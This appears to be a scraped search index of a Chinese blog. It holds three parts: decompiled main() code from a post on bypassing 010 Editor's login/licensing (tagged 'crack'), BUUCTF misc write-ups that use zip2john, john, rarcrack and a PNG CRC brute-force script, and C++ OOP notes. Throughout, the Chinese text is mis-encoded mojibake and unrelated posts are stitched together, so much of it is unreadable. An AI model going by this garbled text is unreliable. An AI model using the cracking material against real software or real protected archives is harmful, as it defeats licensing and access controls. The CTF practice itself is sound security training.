__fastcall main(int a1, char **a2, char **a3) { volatile signed __int32 *v3; // rsi int v4; // edx int v5; // ecx int v6; // er8 int v7; // er9 TForm010Ed *v8; // rdi __int64 (__fastcall ***v9)(_QWORD); // rax QMetaObject *v10; // rax const char *v11; // rax int v12; // edx volatile signed __int32 *v13; // rax __int64 v14; // rdx char *v15; // rsi QApplication *v16; // r14 const QString *v17; // rdx __int64 v18; // r14 TForm010Ed *v19; // rdi unsigned int v20; // er15 int v21; // eax QObject *v22; // r14 const char *v23; // rdx QApplication *v24; // rdi unsigned int v25; // er13 QTimer *v26; // rdx __int64 v27; // r14 volatile signed __int32 **v28; // r13 volatile signed __int32 *v29; // rax volatile signed __int32 **v30; // r8 volatile signed __int32 **i; // rdx int v33; // edx QDesktopWidget *v34; // rax __int64 v35; // rsi const char *v36; // rcx QWidget *v37; // [rsp+0h] [rbp-178h] int v38; // [rsp+0h] [rbp-178h] QWidget *v39; // [rsp+0h] [rbp-178h] QWidget *v40; // [rsp+0h] [rbp-178h] QWidget *v41; // [rsp+0h] [rbp-178h] char v42; // [rsp+8h] [rbp-170h] int v43; // [rsp+8h] [rbp-170h] int v44; // [rsp+10h] [rbp-168h] int v45; // [rsp+10h] [rbp-168h] void *v46; // [rsp+18h] [rbp-160h] BYREF int v47[2]; // [rsp+20h] [rbp-158h] BYREF QTimer *v48; // [rsp+28h] [rbp-150h] QTimer *v49[2]; // [rsp+30h] [rbp-148h] BYREF QDateTime *v50; // [rsp+40h] [rbp-138h] BYREF char v51; // [rsp+48h] [rbp-130h] int v52; // [rsp+50h] [rbp-128h] BYREF char v53; // [rsp+58h] [rbp-120h] __int64 v54; // [rsp+60h] [rbp-118h] BYREF int v55; // [rsp+68h] [rbp-110h] int v56; // [rsp+70h] [rbp-108h] BYREF char v57; // [rsp+78h] [rbp-100h] int v58; // [rsp+80h] [rbp-F8h] BYREF char v59; // [rsp+88h] [rbp-F0h] int v60; // [rsp+90h] [rbp-E8h] BYREF char v61; // [rsp+98h] [rbp-E0h] int v62[2]; // [rsp+A0h] [rbp-D8h] BYREF char v63; // [rsp+A8h] [rbp-D0h] char v64[32]; // [rsp+B0h] [rbp-C8h] BYREF char v65[104]; // [rsp+D0h] [rbp-A8h] BYREF unsigned __int64 v66; // [rsp+138h] [rbp-40h] v66 = __readfsqword(0x28u); qInstallMessageHandler(\u0026R_MessageOutput, a2, a3); sub_5680C0(); nullsub_31(); RProgress::CreateProgress((RProgress *)\u0026R_MessageOutput); QCoreApplication::setAttribute(20LL, 1LL); QCoreApplication::setAttribute(13LL, 1LL); v3 = (volatile signed __int32 *)\u0026v46 + 1; sub_5943F0((QObject *)v65, v37, v42, v44, (int)v46, (int)\u0026QArrayData::shared_null, (char)v48); dword_10B8F10 = (RApplication *)v65; sub_595D00((unsigned int)v65, (unsigned int)\u0026v46 + 4, v4, v5, v6, v7, v38, v43, v45, (char)v46); v8 = (TForm010Ed *)v49; QCoreApplication::arguments((QCoreApplication *)v49); if ( !(unsigned int)TForm010Ed::CheckRunOnlyOnce((TForm010Ed *)v49) || (v8 = dword_10B8F10, !(unsigned int)sub_594C60(dword_10B8F10)) ) { TForm010Ed::CheckDebugFlags(v8); v9 = (__int64 (__fastcall ***)(_QWORD))QApplication::style(v8); v10 = (QMetaObject *)(**v9)(v9); v11 = (const char *)QMetaObject::className(v10); v12 = -1; if ( v11 ) v12 = strlen(v11); QString::fromUtf8_helper((QString *)v62, v11, v12); v13 = *(volatile signed __int32 **)v47; v14 = *(_QWORD *)v62; *(_QWORD *)v62 = *(_QWORD *)v47; *(_QWORD *)v47 = v14; if ( !**(_DWORD **)v62 || **(_DWORD **)v62 != -1 \u0026\u0026 !_InterlockedDecrement(v13) ) QArrayData::deallocate(*(_QWORD *)v62, 2LL, 8LL); v15 = \"QCleanlooksStyle\"; if ( (unsigned __int8)QString::operator==(v47, \"QCleanlooksStyle\") || (v15 = \"QCDEStyle\", (unsigned __int8)QString::operator==(v47, \"QCDEStyle\")) || (v15 = \"QPlastiqueStyle\", (unsigned __int8)QString::operator==(v47, \"QPlastiqueStyle\")) || (v15 = \"QMotifStyle\", (unsigned __int8)QString::operator==(v47, \"QMotifStyle\")) || (v15 = \"QWindowsStyle\", (unsigned __int8)QString::operator==(v47, \"QWindowsStyle\")) || (v15 = \"QGtkStyle\", (unsigned __int8)QString::operator==(v47, \"QGtkStyle\")) || (v15 = \"QFusionStyle\", (unsigned __int8)QString::operator==(v47, \"QFusionStyle\")) ) { v16 = (QApplication *)operator new(0x10uLL); sub_56DC","date":"2022-04-05","objectID":"/2022/04/010editor%E9%80%86%E5%90%91-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87/:1:2","tags":["reverse","crack"],"title":"010Editoré€†å‘-ç™»é™†ç»•è¿‡","uri":"/2022/04/010editor%E9%80%86%E5%90%91-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87/"},{"categories":["WriteUps"],"content":"é‡‘ä¸‰èƒ– ä¸‹è½½é™„ä»¶æ˜¯ä¸ªgif ç”¨gimpæ‰“å¼€æŸ¥çœ‹æ¯ä¸€å¸§ï¼Œå…¶ä¸­å¤¹æ‚ç€flag{he11ohongke} ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:1:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"äºŒç»´ç  é™„ä»¶æ˜¯ä¸ªäºŒç»´ç ï¼Œæ‰«æå‡ºæ–‡å­—secret is here binwalkæ‰«ä¸€ä¸‹ â†ª binwalk ./QR_code.png 2022å¹´ 03æœˆ 28æ—¥ æ˜ŸæœŸä¸€ 22:15:42 CST DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 280 x 280, 1-bit colormap, non-interlaced 471 0x1D7 Zip archive data, encrypted at least v2.0 to extract, compressed size: 29, uncompressed size: 15, name: 4number.txt 650 0x28A End of Zip archive, footer length: 22 binwalk -dåˆ†ä¸å‡ºæ¥ foremoståˆ†ç¦»å‘ç°ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ… kaliåˆ©ç”¨johnè§£å¯† zip2john ./00000000.zip \u003e passwd.txt john passwd.txt å¾—åˆ°å¯†ç 7639 è§£å‹å‹ç¼©åŒ…å¾—åˆ°txtæ–‡ä»¶å³å¯çœ‹åˆ°flagCTF{vjpw_wnoei} ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:2:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"ä½ ç«Ÿç„¶èµ¶æˆ‘èµ° é™„ä»¶æ˜¯ä¸€å¼ jpgæ–‡ä»¶ ç”¨010æŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶æ‹‰åˆ°æœ€åå³å¯çœ‹åˆ°flagflag{stego_is_s0_bor1ing} ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:3:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"Nç§æ–¹æ³•è§£å†³ é™„ä»¶ä¸ºkey.exeï¼Œ010æ‰“å¼€å‘ç°æ˜¯base64å­—ç¬¦ä¸² åœ¨çº¿ç½‘ç«™è½¬æ¢æˆpngå›¾ç‰‡ï¼Œå‘ç°æ˜¯äºŒç»´ç  æ‰«ç å¾—flagKEY{dca57f966e4e4e31fd5b15417da63269} ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:4:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"å¤§ç™½ é™„ä»¶æ˜¯ä¸€å¼ æ‰“ä¸å¼€çš„å›¾ç‰‡ åŸå› æ˜¯å‡ºé¢˜äººæ”¹äº†å›¾ç‰‡é«˜ä½¿crcæ ¡éªŒç æ£€æŸ¥å‡ºé”™ è„šæœ¬çˆ†ç ´å‡ºå›¾ç‰‡é«˜ #!/usr/bin/env python import struct import binascii import os #æ ¹æ®PNG crcæ ¡éªŒç çˆ†ç ´å‡ºå›¾ç‰‡å®½åº¦ã€é«˜åº¦ fi=open('./dabai.png','rb').read() #12-15å­—èŠ‚ä»£è¡¨å›ºå®šçš„æ–‡ä»¶å¤´æ•°æ®å—çš„æ ‡ç¤ºï¼Œ16-19å­—èŠ‚ä»£è¡¨å®½åº¦ï¼Œ20-23å­—èŠ‚ä»£è¡¨é«˜åº¦ï¼Œ24-28å­—èŠ‚åˆ†åˆ«ä»£è¡¨ # Bit depthã€ColorTypeã€Compression methodã€Filter methodã€Interlace method #29-32å­—èŠ‚ä¸ºCRCæ ¡éªŒå’Œ for i in range(10000): #packå‡½æ•°å°†intè½¬ä¸ºbytes,\u003eè¡¨ç¤ºå¤§ç«¯00 00 00 02,Iè¡¨ç¤º4å­—èŠ‚æ— ç¬¦å·int;\u003cè¡¨ç¤ºå°ç«¯ 02 00 00 00 data=fi[12:20]+struct.pack('\u003eI',i)+fi[24:29] #byteçš„å¤§å°ä¸º8bitsè€Œintçš„å¤§å°ä¸º32bits,è½¬æ¢æ—¶è¿›è¡Œä¸è¿ç®—é¿å…è¡¥ç é—®é¢˜0x932f8a6b crc=binascii.crc32(data)\u00260xffffffff #è§£å¼€ä¸ºæ— ç¬¦å·æ•´æ•° if crc==struct.unpack('\u003eI',fi[29:33])[0]\u00260xffffffff : print(hex(i)) 0x1df ç”¨010ä¿®æ”¹å›¾ç‰‡é«˜å³å¯æ­£ç¡®æ˜¾ç¤ºå›¾ç‰‡ flagflag{He1l0_d4_ba1} ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:5:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"åŸºç¡€ç ´è§£ å‹ç¼©åŒ…åŠ å¯†ï¼Œæç¤º4ä½å¯†ç ï¼Œç›´æ¥ç”¨rarcrackçˆ†ç ´ kaliä¸Šè£…çš„rarcrackæœ‰é—®é¢˜ï¼ŒåŸå› ä¸æ˜ï¼Œarchä¸Šåˆè£…äº†ä¸€ä¸ªï¼ŒæˆåŠŸçˆ†å‡ºå¯†ç 2593 è§£å‹å¾—flag.txtï¼Œbase64è§£ç å¾—flag ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:6:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"ä¹Œé•‡å³°ä¼šç§å›¾ Stegsolveæ‰“å¼€ï¼Œæ‰¾åˆ°analyze-\u003efile formatï¼Œå³å¯çœ‹åˆ°flagflag{97314e7864a8f6262 7b26f3f998c37f1} ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:7:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"æ–‡ä»¶ä¸­çš„ç§˜å¯† Gwenviewæ‰“å¼€å›¾ç‰‡ï¼Œå·¦è¾¹å±æ€§æœ‰ä¸€é¡¹Windows Comment ï¼Œå€¼ä¸ºflagï¼Œwindowså¹³å°ç›´æ¥æŸ¥çœ‹å±æ€§-\u003eå¤‡æ³¨åº”è¯¥å°±èƒ½çœ‹åˆ° ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:8:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"wireshark é™„ä»¶ä¸ºä¸€æ®µæµé‡åŒ…ï¼Œè¦æ±‚æ‰¾åˆ°ç™»é™†çš„passwd wiresharkæ‰“å¼€ï¼Œè¿‡æ»¤http.request.method==POSTå³å¯æ‰¾åˆ°ç™»é™†è¯­å¥ flag{ffb7567a1d4f4abdffdb54e022f8facd} ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:9:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"LSB é™„ä»¶æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œç”¨stegsolveæ‰“å¼€ data extract rgbé€‰éƒ½é€‰0ï¼Œdumpä¸‹æ¥å‘ç°æ˜¯ä¸ªäºŒç»´ç ï¼Œæ‰«ç å³å¯æ‹¿åˆ°flag ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:10:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"rar åŠ å¯†å‹ç¼©åŒ…ï¼Œæç¤º4ä½çº¯æ•°å­—ï¼Œrarcrackç›´æ¥çˆ† å¾—åˆ°å¯†ç 8795 flag{1773c5da790bd3caff38e3decd180eb7} ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:11:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"zipä¼ªåŠ å¯† ç²˜ä¸€ç¯‡çŸ¥ä¹æ–‡ç« ï¼Œè¯¦ç»†ä»‹ç»äº†zipçš„ç»“æ„ï¼Œè¿™ä¸€ç‚¹ç”¨010æ‰“å¼€ä¼šçœ‹å¾—ååˆ†æ¸…æ™° æŠŠç¬¬0x47ä½æ”¹æˆ00å³å¯ä¿®æ­£ä¼ªåŠ å¯† è§£å‹å³å¯æ‹¿åˆ°flag ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:12:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["Dev"],"content":"å˜é‡å®šä¹‰ ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:0","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- auto ç”±ç¼–è¯‘å™¨æ ¹æ®ä¸Šä¸‹æ–‡è‡ªåŠ¨ç¡®å®šå˜é‡çš„ç±»å‹ auto i = 3;Â //iæ˜¯intå‹å˜é‡ auto k = 4.0f;Â //kæ˜¯floatå‹å˜é‡ ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:1","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- æŒ‡é’ˆå˜é‡çš„åŠ¨æ€ç”Ÿæˆä¸åˆ é™¤ int* ptr = new int;Â //å•ä¸ªå˜é‡ int* array = new int[10];Â //10å…ƒç´ æ•°ç»„ delete ptr;Â //åˆ é™¤æŒ‡é’ˆå˜é‡æ‰€æŒ‡çš„å•ä¸ªå†…å­˜å•å…ƒ delete[] ptrÂ //åˆ é™¤å¤šä¸ªå†…å­˜å•å…ƒç»„æˆçš„å†…å­˜å— ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:2","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- å·¦å€¼å¼•ç”¨ å…·åå˜é‡çš„åˆ«åï¼šç±»å‹å \u0026 å¼•ç”¨å å˜é‡å int v0; int \u0026 v1 = v0 //v1æ˜¯v0çš„åˆ«åï¼Œå®ƒä»¬æ˜¯å†…å­˜ä¸­æ˜¯åŒä¸€å•å…ƒçš„ä¸¤ä¸ªä¸åŒåå­— å¼•ç”¨å˜é‡å¿…é¡»åœ¨å®šä¹‰æ—¶åˆå§‹åŒ–ï¼ˆèµ‹åˆå€¼ï¼‰ è¢«å¼•ç”¨å˜é‡å¯ä»¥æ˜¯ç»“æ„å˜é‡æˆå‘˜ï¼Œå¦‚s.m å‡½æ•°å‚æ•°å¯ä»¥æ˜¯å¼•ç”¨ç±»å‹ï¼Œè¡¨ç¤ºå‡½æ•°çš„å½¢å‚å’Œå®å‚æ˜¯åŒä¸€ä¸ªå˜é‡ï¼Œæ”¹å˜å½¢å‚å°†æ”¹å˜å®å‚ void swapï¼ˆint \u0026 a; int \u0026 b){ int temp = b; b = a; a = temp; } å‡½æ•°è¿”å›å€¼å¯ä»¥æ˜¯å¼•ç”¨ç±»å‹ï¼Œä½†ä¸èƒ½æ˜¯ä¸´æ—¶å˜é‡ï¼ˆå‡½æ•°å†…éƒ¨å®šä¹‰ï¼‰ ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:3","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- å³å€¼å¼•ç”¨ ä¸èƒ½å–åœ°å€ï¼Œæ²¡æœ‰åå­—çš„å°±æ˜¯å³å€¼ åŒ¿åå˜é‡ï¼ˆä¸´æ—¶å˜é‡ï¼‰çš„åˆ«åï¼šç±»å‹å \u0026\u0026 å¼•ç”¨å è¡¨è¾¾å¼ int \u0026\u0026 sum = 3 + 4; float \u0026\u0026 res = ReturnRvalue(f1,f2); å‡½æ•°å‚æ•°å¼•ç”¨ï¼Œå‡å°‘ä¸´æ—¶å˜é‡æ‹·è´çš„å¼€é”€ void AcceptRvalueRef(T \u0026\u0026 s){â€¦â€¦} å˜é‡çš„åˆå§‹åŒ–ã€ç±»å‹æ¨å¯¼ä¸åŸºäºèŒƒå›´çš„å¾ªç¯ ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:4","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- åˆå§‹åŒ–åˆ—è¡¨ int a[] = {1,3,5}; int a[] {1,3,5}; //c++11æ”¯æŒ ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:5","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- åˆå§‹åŒ–å˜é‡ int a = 3+5; int a = {3+5}; int a (3+5); int a {3+5}; //ä»¥ä¸Šå…¨éƒ¨ç­‰æ•ˆ int* i = new int (10); //int* i =new int * double* d = new double{1.2f}; //åŒä¸Šï¼Œèµ‹åˆå€¼ ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:6","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- ç±»å‹æ¨å¯¼ ä½¿ç”¨decltypeå¯ä»¥å¯¹å˜é‡æˆ–è¡¨è¾¾å¼ç»“æœçš„ç±»å‹è¿›è¡Œæ¨å¯¼ struct{char* name;} anon_u; struct{ int d; decltype(anon_u) id; } anon_s[100]; int main(){ decltype(anon_s) as; cin\u003e\u003eas[0].id.name; â€¦â€¦ } ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:7","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- åŸºäºèŒƒå›´çš„å¾ªç¯ int main(){ int arr[3] = {1,2,3}; for(int e : arr) //auto eä¹Ÿå¯ä»¥ cout\u003c\u003ce; return 0; } å‡½æ•°é‡è½½ åŒåå‡½æ•°ä¸¤ç§å®ç°ï¼Œå¿…é¡»ä¿è¯å‚æ•°ä¸åŒï¼Œè¿”å›å€¼ï¼Œå‚æ•°åç§°ä¸èƒ½ä½œä¸ºåŒºåˆ†æ ‡å‡† void print(char* msg){ cout\u003c\u003cmsg\u003c\u003cendl; } void print(int score){ cout\u003c\u003cscore\u003c\u003cendl; } int main(){ print(\"Hello\"); print(1); return 0; } å‡½æ•°å‚æ•°ç¼ºçœå€¼ä¸è¿½è¸ªè¿”å›ç±»å‹çš„å‡½æ•° ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:8","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- å‡½æ•°å‚æ•°ç¼ºçœå€¼ï¼ˆé»˜è®¤å€¼ï¼‰ ç¼ºçœå€¼å¿…é¡»ä»æœ€åä¸€ä¸ªå¼€å§‹å‘å‰æ’åˆ— void print(char* msg = \"hello\"){ cout\u003c\u003cmsg\u003c\u003cendl; } int main(){ print(\"Beijing...\"); print(); return 0; }//è¾“å‡ºBeijing...hello ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:9","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"-è¿½è¸ªè¿”å›ç±»å‹çš„å‡½æ•° int func(char* ptr, int val); //æ™®é€šå‡½æ•°å£°æ˜ auto func(char* ptr, int val)-\u003eint; //è¿½è¸ªè¿”å›ç±»å‹çš„å‡½æ•°å£°æ˜ auto func(char* ptr, int val)-\u003edecltype(â€¦â€¦) //å¸¸ç”¨æ–¹æ³• ç±»çš„å®šä¹‰ ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:10","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- åŸºæœ¬æ¦‚å¿µ ç”¨æˆ·è‡ªå®šä¹‰çš„ç±»å‹ï¼ŒåŒ…å«å‡½æ•°ä¸æ•°æ®çš„ç‰¹æ®Šâ€œç»“æ„ä½“â€ï¼Œç§°ä¸ºâ€œå¯¹è±¡â€ ç±»ä¸­åŒ…å«çš„å‡½æ•°ï¼Œç§°ä¸ºâ€œæˆå‘˜å‡½æ•°â€ï¼Œæ•°æ®ç§°ä¸ºâ€œæ•°æ®æˆå‘˜â€ ç±»ä¸­å‡½æ•°æ—¢å¯ä»¥åœ¨ç±»ä¸­å®šä¹‰ï¼Œä¹Ÿå¯ä»¥åœ¨ç±»å¤–ç»™å‡ºå®šä¹‰ï¼ˆç±»å::å‡½æ•°åï¼Œå…¶ä¸­::ç§°ä¸ºâ€œåŸŸè¿ç®—ç¬¦ï¼‰ class Matrix{ public: void fill(char dir){ â€¦â€¦; //åœ¨ç±»ä¸­å®šä¹‰æˆå‘˜å‡½æ•° } }; ------------------------------------------------------------ void Matrix::fill(char dir){ â€¦â€¦; //åœ¨ç±»å¤–å®šä¹‰æˆå‘˜å‡½æ•° } ç±»çš„æˆå‘˜ï¼ˆæ•°æ®ã€å‡½æ•°ï¼‰å¯ä»¥æ ¹æ®éœ€è¦åˆ†æˆç»„ï¼Œä¸åŒç»„è®¾ç½®ä¸åŒçš„è®¿é—®æƒé™ æƒé™ç§ç±»ï¼špublicã€privateã€protected ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:11","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- ThisæŒ‡é’ˆ æŒ‡å‘å½“å‰å¯¹è±¡çš„æŒ‡é’ˆå˜é‡ class Matrix{ public: void fill{ â€¦â€¦ this-\u003edata[0][0] = 1; //data[0][0] = 1; äºŒè€…ç­‰ä»· } }; ç±»çš„è®¿é—®æƒé™ä¸å‹å…ƒ ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:12","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- ç±»æˆå‘˜çš„è®¿é—®æƒé™ classä¸­æˆå‘˜ç¼ºçœå±æ€§ä¸ºprivate class Matrix{ publicï¼š void fill(char dir); private: int data[6][6]; }; //ç­‰ä»·äº class Matrix{ int data[6][6]; publicï¼š void fill(char dir); }; åœ¨ç±»çš„å¤–éƒ¨ä¸èƒ½ç”¨.æ“ä½œç¬¦è®¿é—®å¯¹å¯¹è±¡çš„ç§æœ‰æˆå‘˜æˆ–ä¿æŠ¤æˆå‘˜ï¼Œåªèƒ½è®¿é—®å…¬æœ‰å±æ€§ int main(){ Matrix obj; //å®šä¹‰å˜é‡ï¼ˆå¯¹è±¡ï¼‰ obj.fill('u'); //è®¿é—®å…¬æœ‰æˆå‘˜ obj.data[1][1] = 23; //Errorï¼ä¸èƒ½è®¿é—®ç§æœ‰æˆå‘˜ return 0; } ä¿æŠ¤æˆå‘˜ï¼ˆprotectedï¼‰å¯ä»¥åœ¨æ´¾ç”Ÿç±»ï¼ˆå³å­ç±»ï¼‰ä¸­è®¿é—® ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:13","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- å‹å…ƒ å¯ä»¥é€šè¿‡å£°æ˜å‡½æ•°ä¸ºç±»çš„å‹å…ƒæ¥å®ç°è®¿é—®å¯¹è±¡çš„ç§æœ‰æˆå‘˜ class Test{ int id; public: friend void print(Test obj); }; void print(Test obj){ cout\u003c\u003cobj.id\u003c\u003cendl; } æ„é€ å‡½æ•°ä¸ææ„å‡½æ•° ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:14","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- æ„é€ å‡½æ•° ç”±ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆè°ƒç”¨è¯­å¥ï¼Œç”¨äºå¯¹è±¡æ•°æ®æˆå‘˜çš„åˆå§‹åŒ–ï¼Œä»¥åŠå…¶ä»–åˆå§‹åŒ–å·¥ä½œ æ„é€ å‡½æ•°æ²¡æœ‰è¿”å›å€¼ç±»å‹ï¼Œå‡½æ•°åä¸ç±»åç›¸åŒ ç±»çš„æ„é€ å‡½æ•°å¯ä»¥é‡è½½ï¼Œå³å¯ä»¥ä½¿ç”¨ä¸åŒçš„å‡½æ•°å‚æ•°è¿›è¡Œå¯¹è±¡åˆå§‹åŒ– class Student{ long ID; public: Student(long id){ID = id;} Student(int year, int order){ ID = year * 10000 + order; } }; é»˜è®¤æ„é€ å‡½æ•° è‹¥æœªæä¾›æ„é€ å‡½æ•°ï¼Œåˆ™ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆä¸å¸¦ä»»ä½•å‚æ•°çš„æ„é€ å‡½æ•° åœ¨å®šä¹‰å…ƒç´ ä¸ºå¯¹è±¡çš„æ•°ç»„ï¼ˆClassName array_var[NUM];ï¼‰æ—¶ï¼Œç±»å¿…é¡»æä¾›æ„é€ å‡½æ•° æ„é€ å‡½æ•°çš„åˆå§‹åŒ–åˆ—è¡¨ åœ¨()ä¹‹åï¼Œ{ä¹‹å‰ï¼Œä»¥ï¼šå¼€å¤´ï¼Œä½¿ç”¨æ•°æ®æˆå‘˜ï¼ˆåˆå§‹å€¼ï¼‰çš„å½¢å¼ class Student{ long ID; public: Student(long id):ID(id){} Student(int year,int order){ ID = year * 10000 +order; } }; åœ¨æ„é€ å‡½æ•°ä¸­è°ƒç”¨å…¶ä»–æ„é€ å‡½æ•°ï¼ˆå§”æ´¾æ„é€ å‡½æ•°ï¼‰ class Info{ public: Info() {Init();} Info(int i) : Info() {id = i;} Info(char c) : Info() {gender = c;} private: void Init() {â€¦â€¦} int id {2016}; char gender {'M'}; }; ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:15","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- ææ„å‡½æ•° ä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªææ„å‡½æ•°ï¼Œåç§°æ˜¯ï½ç±»åï¼Œæ²¡æœ‰å‡½æ•°è¿”å›å€¼ï¼Œæ²¡æœ‰å‡½æ•°å‚æ•° ç¼–è¯‘å™¨åœ¨å¯¹è±¡ç”Ÿå‘½æœŸç»“æŸåè‡ªåŠ¨è°ƒç”¨ææ„å‡½æ•°ï¼Œ ä»¥ä¾¿é‡Šæ”¾å¯¹è±¡å ç”¨çš„èµ„æº class ClassRoom{ int num; long* ID_list; public: ClassRoom() : num(0), ID_list(0) {} â€¦â€¦ ~ClassRoom(){ if(ID_list) delete[] ID_list; } }; ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:16","tags":["cpp","oop"],"title":"C++ OOP å­¦ä¹ ç¬”è®°","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- æ‹·è´æ„é€ å‡½æ•° 